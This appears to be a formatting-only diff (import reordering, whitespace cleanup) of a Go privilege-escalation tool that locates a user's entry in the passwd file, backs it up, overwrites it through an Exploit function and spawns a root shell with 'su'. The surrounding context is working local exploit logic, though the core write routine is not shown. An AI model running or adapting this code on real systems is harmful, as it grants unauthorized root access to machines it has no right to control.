@@ -38,12 +38,12 @@ THE SOFTWARE.
 package cmd
 
 import (
+	"bufio"
 	"fmt"
+	"io/ioutil"
 	"os"
 	"os/exec"
-	"io/ioutil"
 	"os/user"
-	"bufio"
 	"strings"
 	"syscall"
 
@@ -106,7 +106,7 @@ var escalateCmd = &cobra.Command{
 		// Execute root shell
 		var sh = getDefaultShell()
 		fmt.Printf("Popping root shell\n\n", username)
-		var sargs = []string{"-c", "su " +  username}
+		var sargs = []string{"-c", "su " + username}
 		err = Shell(sh, sargs)
 		if err != nil {
 			fmt.Println(fmt.Errorf("error spawning shell"))
@@ -166,10 +166,10 @@ func findOffsetOfUserInPasswd(user string, path string) (int64, string, string, 
 	defer file.Close()
 
 	fscanner := bufio.NewScanner(file)
-    	for fscanner.Scan() {
+	for fscanner.Scan() {
 		var line = fscanner.Text() + "\n"
 		if !strings.Contains(line, user) {
-			fileOffset += len(line)	
+			fileOffset += len(line)
 		} else {
 			var fields = strings.Split(line, ":")
 			fileOffset += len(strings.Join(fields[:1], ":"))
@@ -183,7 +183,7 @@ func findOffsetOfUserInPasswd(user string, path string) (int64, string, string, 
 			}
 			return int64(fileOffset), toWrite, original, nil
 		}
-    	}
+	}
 
 	return -1, "", "", fmt.Errorf("User was not found in %s", path)
 
@@ -191,7 +191,7 @@ func findOffsetOfUserInPasswd(user string, path string) (int64, string, string, 
 
 func Backup(src string, dest string) error {
 	bytesRead, err := ioutil.ReadFile(src)
-   	if err != nil {
+	if err != nil {
 		return fmt.Errorf("Error opening file: %w", err)
 	}
 
@@ -255,8 +255,8 @@ func Exploit(write *os.File, path string, fileOffset int64, data []byte) error {
 func Shell(path string, args []string) error {
 	cmd := exec.Command(path, args...)
 	cmd.Stdin = os.Stdin
-    	cmd.Stdout = os.Stdout
-    	cmd.Stderr = os.Stderr
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
 	err := cmd.Run()
 	if err != nil {
 		return fmt.Errorf("error spawning shell: %w", err)
